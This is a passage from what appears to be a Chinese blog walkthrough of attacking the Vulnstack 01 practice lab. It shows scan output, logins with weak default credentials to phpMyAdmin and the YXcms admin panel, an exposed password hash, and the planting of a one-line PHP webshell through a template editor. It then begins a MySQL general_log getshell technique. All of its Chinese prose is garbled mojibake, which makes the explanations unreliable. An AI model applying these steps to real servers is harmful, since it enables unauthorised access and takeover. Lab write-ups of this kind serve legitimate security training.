operator">|</span>_clock-skew: mean: -3s, deviation: 0s, median: <span class="token parameter variable">-3s</span><span class="token operator">|</span>_nbstat: NetBIOS name: STU1, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">&gt;</span>, NetBIOS MAC: 00:0c:29:82:51:0c <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span><span class="token operator">|</span> smb-security-mode: <span class="token operator">|</span>   account_used: guest<span class="token operator">|</span>   authentication_level: user<span class="token operator">|</span>   challenge_response: supported<span class="token operator">|</span>_  message_signing: disabled <span class="token punctuation">(</span>dangerous, but default<span class="token punctuation">)</span><span class="token operator">|</span> smb2-security-mode: <span class="token operator">|</span>   <span class="token number">2.02</span>: <span class="token operator">|</span>_    Message signing enabled but not required<span class="token operator">|</span> smb2-time: <span class="token operator">|</span>   date: <span class="token number">2025</span>-02-14T03:39:57<span class="token operator">|</span>_  start_date: <span class="token number">2025</span>-02-13T10:10:59Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">96.01</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å¼€ç€çš„ç«¯å£è¿˜æ˜¯è›®å¤šçš„ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">80</span>ã€135ã€139ã€445ã€1025-1029ã€1036ã€3306<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…¶ä¸­80-webç«¯å£å’Œ3306-mysqlç«¯å£å¯ä»¥é¦–å…ˆé‡ç‚¹å…³æ³¨ã€‚</p><h2 id="2-2-80ç«¯å£-phpstudy-æ¸—é€å°è¯•"><a href="#2-2-80ç«¯å£-phpstudy-æ¸—é€å°è¯•" class="headerlink" title="2.2 80ç«¯å£(phpstudy)æ¸—é€å°è¯•"></a>2.2 80ç«¯å£(phpstudy)æ¸—é€å°è¯•</h2><h3 id="2-2-1-ä¿¡æ¯åˆæ­¥åˆ†æ"><a href="#2-2-1-ä¿¡æ¯åˆæ­¥åˆ†æ" class="headerlink" title="2.2.1 ä¿¡æ¯åˆæ­¥åˆ†æ"></a>2.2.1 ä¿¡æ¯åˆæ­¥åˆ†æ</h3><p>nmapçš„æ‰«æç»“æœæ˜¾ç¤º80ç«¯å£çš„æœåŠ¡ç»„ä»¶æœ‰ï¼šApache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)ã€‚apacheå’Œphpçš„ç‰ˆæœ¬éƒ½æ¯”è¾ƒä½ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">\</span>xE6<span class="token punctuation">\</span>x8E<span class="token punctuation">\</span>xA2<span class="token punctuation">\</span>xE9<span class="token punctuation">\</span>x92<span class="token punctuation">\</span>x88 è§£ç <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>yakitè§£ç ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2013.17.27.png" style="zoom:50%;"><p>kimiè§£ç ï¼šä¸æ­£ç¡®ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2011.42.57.png" style="zoom:37%;"><p>web titleæ˜¯<code>phpStudyæ¢é’ˆ2014</code>ï¼Œä¸‹é¢çš„è®¿é—®æµ‹è¯•ä¹Ÿå°è¯äº†nmapæ‰«æçš„ç»“æœã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2013.24.32.png" style="zoom:40%;"><p>phpæ¢é’ˆæš´éœ²å‡ºäº†ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>æœåŠ¡å™¨å‚æ•°ä¿¡æ¯ï¼š</li></ul><p>æœåŠ¡å™¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬æ˜¯win7ã€ä¸»æœºåSTU1ã€ç®¡ç†å‘˜é‚®ç®±æ˜¯<code>admin@phpStudy.net</code>ï¼Œç»å¯¹è·¯å¾„æ˜¯<code>C:/phpStudy/WWW</code>ã€‚</p><ul><li>PHPç›¸å…³å‚æ•°ï¼š</li></ul><p>æ‰“å¼€è¿œç¨‹æ–‡ä»¶ï¼ˆallow_url_fopenï¼‰æ‰“å¼€ï¼šå¯ä»¥è¿›è¡Œè¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚</p><p>å…è®¸çš„å‡½æ•°ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2013.40.18.png" style="zoom:50%;"><p>assertç­‰é«˜å±å‡½æ•°å¯ä»¥ç”¨æ¥ä»£ç æ‰§è¡Œã€‚</p><ul><li>MySQLæ•°æ®åº“è¿æ¥æ£€æµ‹</li></ul><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2013.44.00.png" style="zoom:67%;"><p>å°è¯•mysqlçš„é»˜è®¤ç”¨æˆ·åå’Œå¯†ç ï¼šroot/root</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2013.29.18.png" style="zoom:40%;"><p>å±…ç„¶èƒ½è¿æ¥åˆ°æ•°æ®åº“ã€‚æ•°æ®åº“å¼±å£ä»¤å®é”¤äº†ã€‚</p><ul><li>å‡½æ•°æ£€æµ‹</li></ul><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2013.46.33.png" style="zoom:40%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2013.47.58.png" style="zoom:50%;"><p>ç»è¿‡åˆæ­¥ä¿¡æ¯åˆ†æå·²ç»å‘ç°äº†mysqlå¼±å£ä»¤ç™»å½•çš„é—®é¢˜å’Œä¸€äº›å…¶ä»–è¾…åŠ©ä¿¡æ¯ã€‚</p><h3 id="2-2-2-ç›®å½•æ‰«æ"><a href="#2-2-2-ç›®å½•æ‰«æ" class="headerlink" title="2.2.2 ç›®å½•æ‰«æ"></a>2.2.2 ç›®å½•æ‰«æ</h3><ul><li>dirsearch</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>python3.9<span class="token punctuation">)</span>  ~/dirsearch<span class="token operator">&gt;</span> python dirsearch.py <span class="token parameter variable">-u</span> http://172.20.10.2/  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.3 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>Extensions: php, asp, aspx, jsp, html, htm <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">25</span> <span class="token operator">|</span> Wordlist size: <span class="token number">12289</span>Target: http://172.20.10.2/<span class="token punctuation">[</span><span class="token number">14</span>:20:06<span class="token punctuation">]</span> Scanning:<span class="token punctuation">[</span><span class="token number">14</span>:20:18<span class="token punctuation">]</span> <span class="token number">403</span> -   225B - /index.php::<span class="token variable">$DATA</span><span class="token punctuation">[</span><span class="token number">14</span>:20:19<span class="token punctuation">]</span> <span class="token number">200</span> -   14KB - /l.php<span class="token punctuation">[</span><span class="token number">14</span>:20:21<span class="token punctuation">]</span> <span class="token number">301</span> -   238B - /phpmyadmin  -<span class="token operator">&gt;</span>  http://172.20.10.2/phpmyadmin/<span class="token punctuation">[</span><span class="token number">14</span>:20:21<span class="token punctuation">]</span> <span class="token number">301</span> -   238B - /phpMyAdmin  -<span class="token operator">&gt;</span>  http://172.20.10.2/phpMyAdmin/<span class="token punctuation">[</span><span class="token number">14</span>:20:21<span class="token punctuation">]</span> <span class="token number">200</span> -   71KB - /phpinfo.php<span class="token punctuation">[</span><span class="token number">14</span>:20:21<span class="token punctuation">]</span> <span class="token number">200</span> -   32KB - /phpmyadmin/ChangeLog<span class="token punctuation">[</span><span class="token number">14</span>:20:21<span class="token punctuation">]</span> <span class="token number">200</span> -    2KB - /phpmyadmin/README<span class="token punctuation">[</span><span class="token number">14</span>:20:22<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpmyadmin/<span class="token punctuation">[</span><span class="token number">14</span>:20:22<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpmyadmin/index.php<span class="token punctuation">[</span><span class="token number">14</span>:20:22<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpMyAdmin/index.php<span class="token punctuation">[</span><span class="token number">14</span>:20:22<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpMyAdmin/<span class="token punctuation">[</span><span class="token number">14</span>:20:22<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpmyAdmin/<span class="token punctuation">[</span><span class="token number">14</span>:20:22<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /phpMyadmin/<span class="token punctuation">[</span><span class="token number">14</span>:20:25<span class="token punctuation">]</span> <span class="token number">403</span> -   225B - /Trace.axd::<span class="token variable">$DATA</span><span class="token punctuation">[</span><span class="token number">14</span>:20:26<span class="token punctuation">]</span> <span class="token number">403</span> -   226B - /web.config::<span class="token variable">$DATA</span>Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰«æåˆ°æ•æ„Ÿç›®å½•ï¼š<code>phpMyAdmin</code></p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2014.24.25.png" style="zoom:30%;"><p>root/root å¼±å£ä»¤ç›´æ¥ç™»å½•ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2014.24.58.png" style="zoom:50%;"><ul><li>URLFinder</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./URLFinder <span class="token parameter variable">-u</span> http://172.20.10.2/ <span class="token parameter variable">-s</span> all <span class="token parameter variable">-m</span> <span class="token number">3</span> <span class="token parameter variable">-o</span> res.html         __   __   ___ _           _ /<span class="token punctuation">\</span> /<span class="token punctuation">\</span>  /__<span class="token punctuation">\</span> / /  / __<span class="token punctuation">(</span>_<span class="token punctuation">)</span>_ __   __<span class="token operator">|</span> <span class="token operator">|</span> ___ _ __/ / <span class="token punctuation">\</span> <span class="token punctuation">\</span>/ <span class="token punctuation">\</span>/// /  / _<span class="token punctuation">\</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _` |/ _ \ '</span>__<span class="token operator">|</span><span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ / _  <span class="token punctuation">\</span> /___ /   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span>  __/ <span class="token operator">|</span> <span class="token punctuation">\</span>___/<span class="token punctuation">\</span>/ <span class="token punctuation">\</span>_<span class="token punctuation">\</span>____<span class="token punctuation">\</span>/    <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>By: pingc0yUpdate: <span class="token number">2023.9</span>.9 <span class="token operator">|</span> å·²æ˜¯æœ€æ–°ç‰ˆæœ¬Github: https://github.com/pingc0y/URLFinderTarget URL: http://172.20.10.2/Start <span class="token number">111</span> Spider<span class="token punctuation">..</span>.Spider OKStart <span class="token number">118</span> Validate<span class="token punctuation">..</span>.Validate OK22JS + 83URL --<span class="token operator">&gt;</span>  res.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ²¡æœ‰æ‰«åˆ°phpmyadminé¡µé¢ï¼Œè¿™ä¸ªå·¥å…·æ›´åå‘äºä»¥æ·±åº¦çˆ¬è™«å½¢å¼è¿›è¡Œé¡µé¢ä¿¡æ¯çš„æå–ã€‚</p><p>é€šè¿‡è¿™ä¸€æ­¥ï¼Œæ‹¿ä¸‹äº†<code>phpmyadmin</code>çš„åå°ç®¡ç†é¡µé¢ã€‚</p><h3 id="2-2-3-phpmyadminä¿¡æ¯åˆ†æ"><a href="#2-2-3-phpmyadminä¿¡æ¯åˆ†æ" class="headerlink" title="2.2.3 phpmyadminä¿¡æ¯åˆ†æ"></a>2.2.3 phpmyadminä¿¡æ¯åˆ†æ</h3><h4 id="2-2-3-1-æ•°æ®åº“åˆ†æ"><a href="#2-2-3-1-æ•°æ®åº“åˆ†æ" class="headerlink" title="2.2.3.1 æ•°æ®åº“åˆ†æ"></a>2.2.3.1 æ•°æ®åº“åˆ†æ</h4><p>æ‹¿ä¸‹phpmyadminä¹‹åï¼Œç›¸å½“äºå·²ç»æ‹¿ä¸‹äº†webæœåŠ¡å™¨çš„æ•°æ®åº“ï¼Œå¯ä»¥å…ˆåˆ†æä¸€ä¸‹æ•°æ®åº“ä¿¡æ¯ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2014.55.40.png" style="zoom:50%;"><p>è¿™é‡Œæœ‰ä¸€ä¸ª<code>newyxcms</code>çš„æ•°æ®åº“ï¼Œæƒ³åˆ°å¯èƒ½ä¼šå¯¹åº”æŸä¸ªç«™ç‚¹ï¼ˆå¦‚æœåå­—ä¸åœ¨dirseachçš„å­—å…¸ä¸­å¾ˆéš¾æ‰«åˆ°ï¼‰ã€‚</p><p>å°è¯•è®¿é—®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.20.10.2/newyxcms ã€404ã€‘http://172.20.10.2/yxcms ã€æˆåŠŸçœ‹åˆ°ä¸‹é¢çš„ä¸€ä¸ªCMSç³»ç»Ÿã€‘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2014.57.31.png" style="zoom:30%;"><p>å¯ä»¥åœ¨æ•°æ®åº“ä¸­æŸ¥çœ‹ç®¡ç†å‘˜çš„å¯†ç ä¿¡æ¯ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.01.34.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">admin:168a73655bfecefdb15b14984dd2ad60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.02.25.png" style="zoom:50%;"><p>å¯†ç æ˜¯ä¸€ä¸²å“ˆå¸Œå€¼ï¼Œå°è¯•åˆ°CMD5ç½‘ç«™ç ´è§£ï¼Œä½†æ˜¯è¦ä»˜è´¹ã€‚ã€‚ã€‚</p><p>å°è¯•admin 123456ç™»å½•ï¼Ÿ</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.10.10.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.11.20.png" style="zoom:33%;"><p>æ„Ÿè§‰è¿™é‡Œå¯ä»¥å°è¯•çˆ†ç ´ä¸€ä¸‹ï¼Œå› ä¸ºæ¯æ¬¡å¼¹ç”¨æˆ·åå’Œå¯†ç é”™è¯¯ä¹‹åç‚¹å‡»ç¡®å®šï¼Œå›åˆ°ç™»å½•é¡µé¢ï¼Œä½†æ˜¯éªŒè¯ç æ²¡å˜è¿˜æ˜¯èƒ½é‡å¤ä½¿ç”¨ã€‚</p><ul><li>ç¡®å®šæ˜¯å¦æœ‰è¯»å†™æ–‡ä»¶çš„æ¡ä»¶</li></ul><p>å¯ä»¥å€ŸåŠ©<code>show global variables like '%secure%';</code>å‘½ä»¤æ¥æŸ¥çœ‹è¯¥å‚æ•°ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.19.24.png" style="zoom:40%;"><p><code>secure file priv</code>çš„å€¼ä¸ºNULLï¼Œæ— æ³•è¯»å†™æ–‡ä»¶ã€‚å¯ä»¥ç¼–è¾‘ï¼Œå°†å®ƒè®¾ç½®ä¸ºç©ºï¼Œä½†æ˜¯æç¤ºåªè¯»ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.20.29.png" style="zoom:40%;"><p>é‚£ä¹ˆå›å¤´åœ¨ä»”ç»†çœ‹ä¸€ä¸‹é¡µé¢ï¼ˆä¹Ÿæ˜¯åœ¨äº’è”ç½‘æœç´¢<code>YXcmsæ¼æ´</code>æ—¶æ‰¾åˆ°çš„å‚è€ƒï¼Œæ²¡æƒ³åˆ°æç¤ºä¼šè¿™ä¹ˆæ˜æ˜¾ã€‚ã€‚ã€‚ï¼‰</p><h3 id="2-2-4-YXcmsæ¼æ´æŒ–æ˜"><a href="#2-2-4-YXcmsæ¼æ´æŒ–æ˜" class="headerlink" title="2.2.4 YXcmsæ¼æ´æŒ–æ˜"></a>2.2.4 YXcmsæ¼æ´æŒ–æ˜</h3><h4 id="2-2-4-1-YXcmsåå°ç™»å½•"><a href="#2-2-4-1-YXcmsåå°ç™»å½•" class="headerlink" title="2.2.4.1 YXcmsåå°ç™»å½•"></a>2.2.4.1 YXcmsåå°ç™»å½•</h4><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.25.16.png" style="zoom:50%;"><p>åœ¨é¦–é¡µçš„å…¬å‘Šä¿¡æ¯æ å¤„æœ‰å¦‚ä¸‹çš„ä¿¡æ¯ï¼šåå°åœ°å€è¯·åœ¨ç½‘å€åé¢åŠ ä¸Š/index.php?r=adminè¿›å…¥ï¼Œä¸”è´¦æˆ·åå¯†ç æ˜¯admin/123456ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.26.30.png" style="zoom:50%;"><p>æˆåŠŸç™»å½•åå°ã€‚</p><h4 id="2-2-4-2-åå°æ¼æ´æŒ–æ˜"><a href="#2-2-4-2-åå°æ¼æ´æŒ–æ˜" class="headerlink" title="2.2.4.2 åå°æ¼æ´æŒ–æ˜"></a>2.2.4.2 åå°æ¼æ´æŒ–æ˜</h4><ul><li>SQLæ‰§è¡ŒåŠŸèƒ½</li></ul><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.51.44.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.52.03.png" style="zoom:50%;"><p>æ— æ³•å†™å…¥æ–‡ä»¶ã€‚</p><ul><li><code>å‰å°æ¨¡ç‰ˆ</code>ç®¡ç†åŠŸèƒ½</li></ul><p>åœ¨<code>å‰å°æ¨¡ç‰ˆ</code>å¤„ï¼Œæœ‰ä¸€ä¸ª<code>ç®¡ç†æ¨¡ç‰ˆæ–‡ä»¶</code>çš„åŠŸèƒ½ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.39.17.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.39.58.png" style="zoom:50%;"><p>å°è¯•æ–°å»ºäº†ä¸€ä¸ªyjh.phpæ¨¡ç‰ˆã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.38.19.png" style="zoom:50%;"><p>ä½†æ˜¯ä¸çŸ¥é“å¦‚ä½•ä½¿ç”¨ï¼Œä¹Ÿä¸çŸ¥é“è®¿é—®è·¯å¾„ã€‚</p><p>å¯ä»¥ä¿®æ”¹å½“å‰çš„æ¨¡æ¿æ–‡ä»¶ï¼Œæ’å…¥æœ¨é©¬ï¼ŒæŸ¥çœ‹<code>index_index.php</code>æ–‡ä»¶ï¼Œåˆ†æå¯èƒ½æ˜¯å½“å‰ç”¨çš„é¦–é¡µæ¨¡ç‰ˆï¼Œï¼ˆå¦‚æœå®åœ¨ç¡®å®šä¸äº†æ˜¯å“ªä¸€ä¸ªï¼Œå¯ä»¥å…¨æ’ä¸€éï¼‰ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2015.56.52.png" alt="åŸå†…å®¹" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2016.53.37.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2016.54.05.png" style="zoom:50%;"><p>å†æ¬¡è®¿é—®çš„æ—¶å€™å‘ç°è¾“å‡ºäº†12345678çš„å†…å®¹ï¼Œè¯´æ˜ä¸€å¥è¯æœ¨é©¬ä¹Ÿå·²ç»æ‰§è¡Œäº†ã€‚</p><blockquote><h4 id="å¦‚ä½•æ‰¾åˆ°æ–°å»ºçš„æ¨¡æ¿ï¼ˆæœ¨é©¬ï¼‰æ–‡ä»¶ï¼Ÿ"><a href="#å¦‚ä½•æ‰¾åˆ°æ–°å»ºçš„æ¨¡æ¿ï¼ˆæœ¨é©¬ï¼‰æ–‡ä»¶ï¼Ÿ" class="headerlink" title="å¦‚ä½•æ‰¾åˆ°æ–°å»ºçš„æ¨¡æ¿ï¼ˆæœ¨é©¬ï¼‰æ–‡ä»¶ï¼Ÿ"></a>å¦‚ä½•æ‰¾åˆ°æ–°å»ºçš„æ¨¡æ¿ï¼ˆæœ¨é©¬ï¼‰æ–‡ä»¶ï¼Ÿ</h4><p>åˆ›å»ºçš„æœ¨é©¬æ¨¡ç‰ˆï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.51.50.png" style="zoom:50%;"><p>å­—å…¸ä¸å¤Ÿå¼ºå¤§ï¼Œæ²¡æ‰«å‡ºæ¥ beifen.rarï¼Œåœ¨æ ¹ç›®å½•ä¸‹é¢æœ‰è¿™ä¹ˆä¸€ä¸ªæ–‡ä»¶ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.20.10.2/beifen.rar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.42.55.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.45.11.png" style="zoom:50%;"><p>æœç´¢ä¸€ä¸‹<code>index_index.php</code>,å¯ä»¥çœ‹åˆ°å­˜å‚¨çš„æ¨¡ç‰ˆè·¯å¾„ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yxcms/protected/apps/default/view/default/yjh.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.48.55.png" style="zoom:50%;"><p>getshell:</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.49.50.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.50.42.png" style="zoom:50%;"></blockquote><h3 id="2-2-4-getshell"><a href="#2-2-4-getshell" class="headerlink" title="2.2.4 getshell"></a>2.2.4 getshell</h3><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2016.58.31.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2016.59.10.png" style="zoom:50%;"><p>è·å–åˆ°çš„æ˜¯<code>god\administrator</code>æƒé™ã€‚æˆåŠŸæ‹¿ä¸‹DMZå»çš„webæœåŠ¡ç³»ç»Ÿã€‚</p><h2 id="2-3-Mysqlæ—¥å¿—æ–‡ä»¶getshell"><a href="#2-3-Mysqlæ—¥å¿—æ–‡ä»¶getshell" class="headerlink" title="2.3 Mysqlæ—¥å¿—æ–‡ä»¶getshell"></a>2.3 Mysqlæ—¥å¿—æ–‡ä»¶getshell</h2><p>é™¤äº†åˆ©ç”¨ä¿®æ”¹yxcmsåå°æ¨¡ç‰ˆæ–‡ä»¶æ’å…¥æœ¨é©¬getshellä¹‹å¤–ï¼Œè¿˜å¯ä»¥åˆ©ç”¨Mysqlæ—¥å¿—æ–‡ä»¶getshellã€‚</p><h3 id="2-3-1-æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶çš„è®¾ç½®"><a href="#2-3-1-æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶çš„è®¾ç½®" class="headerlink" title="2.3.1 æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶çš„è®¾ç½®"></a>2.3.1 æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶çš„è®¾ç½®</h3><ul><li>æ‰§è¡Œå‘½ä»¤ï¼š<code>show variables like '%general%';</code> æŸ¥çœ‹æ—¥å¿—çŠ¶æ€ï¼š</li></ul><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.24.12.png" style="zoom:50%;"><p>æˆ–è€…ç›´æ¥æŸ¥çœ‹å˜é‡ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.22.13.png" style="zoom:40%;"><p>å½“å¼€å¯ general_log æ—¶ï¼Œæ‰€æ‰§è¡Œçš„ SQL è¯­å¥éƒ½ä¼šå‡ºç°åœ¨ stu1.log æ–‡ä»¶ä¸­ã€‚</p><p>é‚£ä¹ˆå¦‚æœä¿®æ”¹ general_log_file çš„å€¼ä¸ºä¸€ä¸ªphpæ–‡ä»¶ï¼Œåˆ™æ‰€æ‰§è¡Œçš„ SQL è¯­å¥å°±ä¼šå¯¹åº”ç”Ÿæˆåœ¨å¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ Getshellã€‚</p><h3 id="2-3-2-æ‰“å¼€general-log"><a href="#2-3-2-æ‰“å¼€general-log" class="headerlink" title="2.3.2 æ‰“å¼€general log"></a>2.3.2 æ‰“å¼€general log</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SET GLOBAL <span class="token assign-left variable">general_log</span><span class="token operator">=</span><span class="token string">'on'</span>`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-14%2017.27.33.png" style="zoom:50%;"><img 